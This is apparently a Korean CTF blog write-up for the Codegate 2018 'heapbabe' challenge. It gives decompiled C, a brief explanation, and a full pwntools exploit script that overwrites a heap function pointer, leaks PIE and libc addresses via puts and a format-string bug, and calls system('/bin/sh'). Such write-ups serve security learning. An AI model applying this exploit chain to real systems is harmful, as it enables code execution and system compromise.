---
title: "2018 Codegate heapbabe"
date: 2020-3-16
ctf: Codegate CTF
layout: post
published : false
---

조금 신기하고 재밌게 풀었다. 

```c
unsigned __int64 alloc()
{
  signed int i; // [rsp+4h] [rbp-102Ch]
  struct chunk *ptr; // [rsp+8h] [rbp-1028h]
  char *dest; // [rsp+10h] [rbp-1020h]
  size_t nbytes; // [rsp+18h] [rbp-1018h]
  size_t nbytesa; // [rsp+18h] [rbp-1018h]
  char buf; // [rsp+20h] [rbp-1010h]
  unsigned __int64 v7; // [rsp+1028h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  ptr = malloc(0x20uLL);
  printf("- size : ");
  nbytes = input();
  if ( nbytes <= 0x1000 )
  {
    printf("- contents : ");
    if ( read(0, &buf, nbytes) == -1 )
    {
      puts("** Invalid contents **");
      exit(1);
    }
    nbytesa = strlen(&buf);
    if ( nbytesa > 0xF )
    {

      dest = malloc(nbytesa);
      if ( !dest )
      {
        puts("** Failed to malloc **");
        exit(1);
      }
      strncpy(dest, &buf, nbytesa);
      *ptr->data = dest;
      ptr->pointer = free_2;
    }
    else
    {
      strncpy(ptr->data, &buf, nbytesa);
      ptr->pointer = free_1;
    }
    ptr->size = nbytesa;
    for ( i = 0; i <= 7; ++i )
    {
      if ( !*(&note + 4 * i) )
      {
        *(&note + 4 * i) = 1;
        *(&note + 2 * i + 1) = ptr;
        break;
      }
    }
    if ( i == 8 )
    {
      puts("** No more space to alloc... **");
      (ptr->pointer)(ptr, &buf);
    }
  }
  else
  {
    puts("** Invalid size **");
    free(ptr);
  }
  return __readfsqword(0x28u) ^ v7;
}
```

pie가 걸려있어서 1byte 덮어서 puts로 pie base leak해주고 pie주소 구했으니까 printf로 overwrite시켜서 인자에 fsb터지게 줘서 스택에 stdout leak해주고 이번엔 system으로 덮고 인자로 /bin/sh; 줬다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./heapbabe')
libc = e.libc
p = process('./heapbabe',aslr=True)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
ru = lambda x : p.recvuntil(x)
rc = lambda x : p.recv(x)
note = 0x00000000002020C0

def alloc(size,content):
	sa('>>','A')
	sa(':',str(size))
	sa(':',content)

def free(idx,data,delete=0):
	sa('>>','F')
	sa('- id :',str(idx))
	if delete == 1:
		sa("Type 'DELETE' if you really want to free :","DELETE")
	else:
		sa("Type 'DELETE' if you really want to free :",data)

alloc(0x60,'A'*0x60)
alloc(0x60,'B'*0x60)
free(0,'', delete=1)
free(1,'', delete=1)
free(0,'', delete=1)
alloc(0xf,'\x00') # 1 data ptr -> 0
alloc(0x20,'C'*0x18+p16(0xaa)) # 1byte -> call <puts@plt>

free(0,'',delete=1)
ru('C'*0x18)
pie_base = u64(p.recv(6).ljust(8,'\x00')) - 0xcaa
log.info('pie_base : {}'.format(hex(pie_base)))

payload = '%12$lx'
payload = payload.ljust(0x18,'A')
payload += p64(pie_base + 0xdf0) # call <printf@plt>

free(1,'',delete=1)
alloc(0xf,'\x00')
alloc(0x20,payload)
free(1,'',delete=1)

ru('7f')
libc_base = int('0x7f'+rc(10),16) - 0x3c56a3
log.info('libc_base : {}'.format(hex(libc_base)))

p.sendline('\x0a')

payload = '/bin/sh;'
payload = payload.ljust(0x18,'A')
payload += p64(libc_base + libc.symbols['system'])

free(0,'',delete=1)
alloc(0xf,'\x00')
alloc(0x20,payload)
free(0,'',delete=1)

p.interactive()
```

